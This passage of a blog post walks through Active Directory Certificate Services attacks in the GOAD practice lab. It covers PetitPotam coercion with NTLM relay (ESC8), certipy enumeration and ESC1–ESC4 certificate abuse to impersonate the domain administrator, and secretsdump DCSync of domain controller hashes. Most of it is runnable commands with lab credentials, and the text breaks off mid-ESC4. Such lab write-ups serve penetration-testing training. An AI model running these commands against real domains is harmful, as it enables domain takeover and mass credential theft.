<!DOCTYPE html><html lang="fr" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="GOAD - part 6 - ADCS" /><meta property="og:locale" content="fr" /><meta name="description" content="In the previous post (Goad pwning part5) we tried some attacks with a user account on the domain. On this part we will try attacks when an ADCS is setup in the domain. First we will use petitpotam unauthenticated and ESC8 attack to get domain admin on essos.local, next we will enumerate template certificate with certipy, bloodhound and a user account. To finish we will exploit the following attacks : certipy, esc1, esc2, esc3, esc4, esc6, certifried and shadow credentials." /><meta property="og:description" content="In the previous post (Goad pwning part5) we tried some attacks with a user account on the domain. On this part we will try attacks when an ADCS is setup in the domain. First we will use petitpotam unauthenticated and ESC8 attack to get domain admin on essos.local, next we will enumerate template certificate with certipy, bloodhound and a user account. To finish we will exploit the following attacks : certipy, esc1, esc2, esc3, esc4, esc6, certifried and shadow credentials." /><link rel="canonical" href="https://mayfly277.github.io/posts/GOADv2-pwning-part6/" /><meta property="og:url" content="https://mayfly277.github.io/posts/GOADv2-pwning-part6/" /><meta property="og:site_name" content="Mayfly" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-07T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="GOAD - part 6 - ADCS" /><meta name="twitter:site" content="@M4yFly" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"In the previous post (Goad pwning part5) we tried some attacks with a user account on the domain. On this part we will try attacks when an ADCS is setup in the domain. First we will use petitpotam unauthenticated and ESC8 attack to get domain admin on essos.local, next we will enumerate template certificate with certipy, bloodhound and a user account. To finish we will exploit the following attacks : certipy, esc1, esc2, esc3, esc4, esc6, certifried and shadow credentials.","url":"https://mayfly277.github.io/posts/GOADv2-pwning-part6/","@type":"BlogPosting","headline":"GOAD - part 6 - ADCS","dateModified":"2022-10-22T10:56:54+02:00","datePublished":"2022-09-07T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mayfly277.github.io/posts/GOADv2-pwning-part6/"},"@context":"https://schema.org"}</script><title>GOAD - part 6 - ADCS | Mayfly</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mayfly"><meta name="application-name" content="Mayfly"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/mayfly.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Mayfly</a></div><div class="site-subtitle font-italic">Hack, Code, Sleep, Repeat</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/mayfly277" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/M4yFly" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['mayfly277','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="https://www.root-me.org/mayfly" aria-label="rootme" class="order-6" target="_blank" rel="noopener"> <i class="fas fa-skull"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-7" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>GOAD - part 6 - ADCS</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>GOAD - part 6 - ADCS</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> mayfly </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Sep 7, 2022, 12:00 AM +0200" >Sep 7<i class="unloaded">2022-09-07T00:00:00+02:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Oct 22, 2022, 10:56 AM +0200" >Oct 22<i class="unloaded">2022-10-22T10:56:54+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1854 words">10 min read</span></div></div><div class="post-content"><p>In the previous post (<a href="/posts/GOADv2-pwning-part5/">Goad pwning part5</a>) we tried some attacks with a user account on the domain. On this part we will try attacks when an ADCS is setup in the domain. First we will use petitpotam unauthenticated and ESC8 attack to get domain admin on essos.local, next we will enumerate template certificate with certipy, bloodhound and a user account. To finish we will exploit the following attacks : certipy, esc1, esc2, esc3, esc4, esc6, certifried and shadow credentials.</p><h2 id="esc8---coerce-to-domain-admin">ESC8 - coerce to domain admin</h2><ul><li>To make this attack work we will need :<ul><li>ADCS running on the domain with web enrollment enabled.<li>A working coerce method (here we use petitpotam unauthent, but an authenticated printerbug or other coerce methods will work the same)<li>There is a useful template to exploit ESC8, by default on an active directory, its name is <em>DomainController</em></ul></ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mindmap_adcs_esc8.png" alt="mindmap_adcs_esc8.png" /></p><ul><li>Let’s check if the web enrollement is up and running at : <a href="http://192.168.56.23/certsrv/certfnsh.asp">http://192.168.56.23/certsrv/certfnsh.asp</a></ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_webenrollement.png" alt="adcs_webenrollement.png" /></p><ul><li><p>The server ask for an authentication so all is fine :)</p><li><p>Add a listener to relay SMB authentication to HTTP with impacket ntlmrelayx</p></ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ntlmrelayx.py <span class="nt">-t</span> http://192.168.56.23/certsrv/certfnsh.asp <span class="nt">-smb2support</span> <span class="nt">--adcs</span> <span class="nt">--template</span> DomainController
</pre></table></code></div></div><ul><li>Launch the coerce with <a href="https://github.com/topotam/PetitPotam">petitpotam</a> unauthenticated (this will no more work on an up to date active directory but other coerce methods authenticated will work the same)</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>petitpotam.py 192.168.56.1 meereen.essos.local 
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/petitpotam_adcs.png" alt="petitpotam_adcs.png" /></p><ul><li>ntlmrelayx will relay the authentication to the web enrollement and get the certificate</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_ntlmrelay.png" alt="adcs_ntlmrelay.png" /></p><ul><li>Ask for a TGT with the certificate we just get (we copied it to the file cert.b64)</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gettgtpkinit.py <span class="nt">-pfx-base64</span> <span class="si">$(</span><span class="nb">cat </span>cert.b64<span class="si">)</span> <span class="s1">'essos.local'</span>/<span class="s1">'meereen$'</span> <span class="s1">'meereen.ccache'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/ask_tgt_ecs8.png" alt="ask_tgt_ecs8.png" /></p><ul><li>And now we got a TGT for meereen so we can launch a DCsync and get all the ntds.dit content.</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/esc8/meereen.ccache
secretsdump <span class="nt">-k</span> <span class="nt">-no-pass</span> ESSOS.LOCAL/<span class="s1">'meereen$'</span>@meereen.essos.local
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/esc8_dcsync.png" alt="esc8_dcsync.png" /></p><h2 id="esc8---with-certipy">ESC8 - with certipy</h2><p>Oliver Lyak as done a wonderful job on the ADCS attack tool <a href="https://github.com/ly4k/Certipy">certipy</a> to automatise a lots of things.</p><p>Let’s do the same attack with certipy, setup the listener :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy relay <span class="nt">-ca</span> 192.168.56.23 <span class="nt">-template</span> DomainController
</pre></table></code></div></div><ul><li>trig the coerce just like we did before with petitpotam</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>petitpotam.py 192.168.56.1 meereen.essos.local
</pre></table></code></div></div><ul><li>Now we got the certificate so we can get the NT hash of the DC and also the TGT with the command :</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy auth <span class="nt">-pfx</span> meereen.pfx <span class="nt">-dc-ip</span> 192.168.56.12 
</pre></table></code></div></div><ul><li>And we can launch a DCsync with secretsdump and the ticket we get</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/esc8/meereen.ccache
secretsdump <span class="nt">-k</span> <span class="nt">-no-pass</span> ESSOS.LOCAL/<span class="s1">'meereen$'</span>@meereen.essos.local

<span class="c"># or with the hash</span>

secretsdump <span class="nt">-hashes</span> <span class="s1">':39d964a01c61c19fe36c71627d7ab56c'</span> <span class="nt">-no-pass</span> ESSOS.LOCAL/<span class="s1">'meereen$'</span>@meereen.essos.local
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/esc8_with_certipy.png" alt="esc8_with_certipy.png" /></p><h2 id="adcs-reconnaissance-and-enumeration-with-certipy-and-bloodhound">ADCS reconnaissance and enumeration (with certipy and bloodhound)</h2><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mindmap_enumerate_adcs.png" alt="mindmap_enumerate_adcs.png" /></p><ul><li>Let’s start the enumeration with certipy</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy find <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-dc-ip</span> 192.168.56.12
</pre></table></code></div></div><ul><li>This will search the certificate server, and dump all the information needed in three format :<ul><li>bloodhound : a zip ready to import in bloodhound (if you use certipy 4.0 you will have to install the <a href="https://github.com/ly4k/BloodHound/releases">bloodhound gui modified by oliver lyak</a>, if you do not want to use the modified version, you must use the <code class="language-plaintext highlighter-rouge">-old-bloodhound</code> option)<li>json : information json formated<li>txt : a textual format</ul></ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_find.png" alt="adcs_find.png" /></p><ul><li>Certipy 4.0 reintroduce also the <code class="language-plaintext highlighter-rouge">-vulnerable</code> option to show the vulnerable templates.</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy find <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-vulnerable</span> <span class="nt">-dc-ip</span> 192.168.56.12 <span class="nt">-stdout</span>
</pre></table></code></div></div><ul><li>We can find an ESC1 vulnerable template :<ul><li>Enrollment rights to all domain users<li>Client authentication<li>And Enrollee supplies subject</ul></ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_find_esc1.png" alt="adcs_find_esc1.png" /></p><ul><li>There is also an ESC2 vulnerable template:</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_find_esc2.png" alt="adcs_find_esc2.png" /></p><p>And others vulnerable templates, let’s take a look in bloodhound.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nb">cd</span> /opt/tools
wget https://github.com/ly4k/BloodHound/releases/download/v4.2.0-ly4k/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip <span class="nt">-d</span> BloodHound4.2-ly4k
<span class="nb">rm </span>BloodHound-linux-x64.zip
neo4j start
/opt/tools/BloodHound4.2-ly4k/BloodHound-linux-x64/BloodHound  <span class="nt">--no-sandbox</span> <span class="nt">--disable-dev-shm-usage</span>
</pre></table></code></div></div><ul><li>Import the zip file created with certipy.<li>And take an overview with : PKI-&gt;Find certificate authority, select the certificate authority and click : “see enabled templates”</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_enabled_template.png" alt="adcs_enabled_template.png" /></p><blockquote><p>if you don’t have esc4 setup on the lab, please update and run the following commands:</p><ul><li><code class="language-plaintext highlighter-rouge">ansible-playbook acl.yml</code><li><code class="language-plaintext highlighter-rouge">ansible-playbook adcs.yml</code><li>and next rerun bloodhound and certipy :)</ul></blockquote><p>Now you should be ok with acl and adcs ESC4 settings :)</p><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_esc4_genericall.png" alt="adcs_esc4_genericall.png" /></p><h2 id="adcs---exploitation">ADCS - exploitation</h2><h2 id="adcs---esc1">ADCS - ESC1</h2><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mindmap_adcs_esc1.png" alt="mindmap_adcs_esc1.png" /></p><ul><li>enumerate</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy find <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-dc-ip</span> 192.168.56.12
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_bh_esc1.png" alt="adcs_bh_esc1.png" /></p><ul><li>query the certificate<ul><li>target : the ca server<li>tempalte : the vulnerable template<li>upn : the target user we want to impersonate</ul></ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy req <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-target</span> braavos.essos.local <span class="nt">-template</span> ESC1 <span class="nt">-ca</span> ESSOS-CA <span class="nt">-upn</span> administrator@essos.local
</pre></table></code></div></div><ul><li>authentication with the pfx we request before</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 192.168.56.12
</pre></table></code></div></div><blockquote><p>if you get the error : “[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)”, the lab is in error, i don’t know why sometimes it is not working by now, but you can reboot DC3 to fix this: <code class="language-plaintext highlighter-rouge">vagrant reload DC03</code></p></blockquote><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_exploit_esc1.png" alt="adcs_exploit_esc1.png" /></p><h2 id="adcs---esc2--esc3">ADCS - ESC2 &amp; ESC3</h2><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mindmap_adcs_esc23.png" alt="mindmap_adcs_esc23.png" /></p><ul><li><p>As said in the certipy page : <em>“ESC2 is when a certificate template can be used for any purpose. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3 for most certificate templates.”</em></p><li><p>Let’s distinguish the 2 attacks by trying with ESC2 :</p></ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_find_esc2_3.png" alt="adcs_find_esc2_3.png" /></p><ul><li>Query cert</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy req <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-target</span> 192.168.56.23 <span class="nt">-template</span> ESC2 <span class="nt">-ca</span> ESSOS-CA
</pre></table></code></div></div><ul><li>Query cert with the Certificate Request Agent certificate we get before (-pfx)</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy req <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-target</span> 192.168.56.23 <span class="nt">-template</span> User <span class="nt">-ca</span> ESSOS-CA <span class="nt">-on-behalf-of</span> <span class="s1">'essos\administrator'</span> <span class="nt">-pfx</span> khal.drogo.pfx
</pre></table></code></div></div><ul><li>Auth</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 192.168.56.12
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_exploit_esc2.png" alt="adcs_exploit_esc2.png" /></p><ul><li>We also can do the same with the ESC3-CRA and ESC3 templates in the lab :</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>certipy req <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-target</span> 192.168.56.23 <span class="nt">-template</span> ESC3-CRA <span class="nt">-ca</span> ESSOS-CA
certipy req <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-target</span> 192.168.56.23 <span class="nt">-template</span> ESC3 <span class="nt">-ca</span> ESSOS-CA <span class="nt">-on-behalf-of</span> <span class="s1">'essos\administrator'</span> <span class="nt">-pfx</span> khal.drogo.pfx
certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-username</span> administrator <span class="nt">-domain</span> essos.local <span class="nt">-dc-ip</span> 192.168.56.12
</pre></table></code></div></div><h2 id="adcs---esc4">ADCS - ESC4</h2><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_esc4_mindmap.png" alt="adcs_esc4_mindmap.png" /></p><p><img data-proofer-ignore data-src="/assets/blog/GOAD/adcs_esc4_genericall.png" alt="adcs_esc4_genericall.png" /></p><ul><li>Take the ESC4 template and change it to be vulnerable to ESC1 technique by using the genericWrite privilege we got. (we didn’t set the target here as we target the ldap)</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy template <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-template</span> ESC4 <span class="nt">-save-old</span> <span class="nt">-debug</span>
</pre></table></code></div></div><ul><li>Exploit ESC1 on the modified ESC4 template</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy req <span class="nt">-u</span> khal.drogo@essos.local <span class="nt">-p</span> <span class="s1">'horse'</span> <span class="nt">-target</span> braavos.essos.local <span class="nt">-template</span> ESC4 <span class="nt">-ca</span> ESSOS-CA <span class="nt">-upn</span> administrator@essos.local
</pre></table></code></div></div><ul><li>authentication with the pfx</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 192.168.56.12
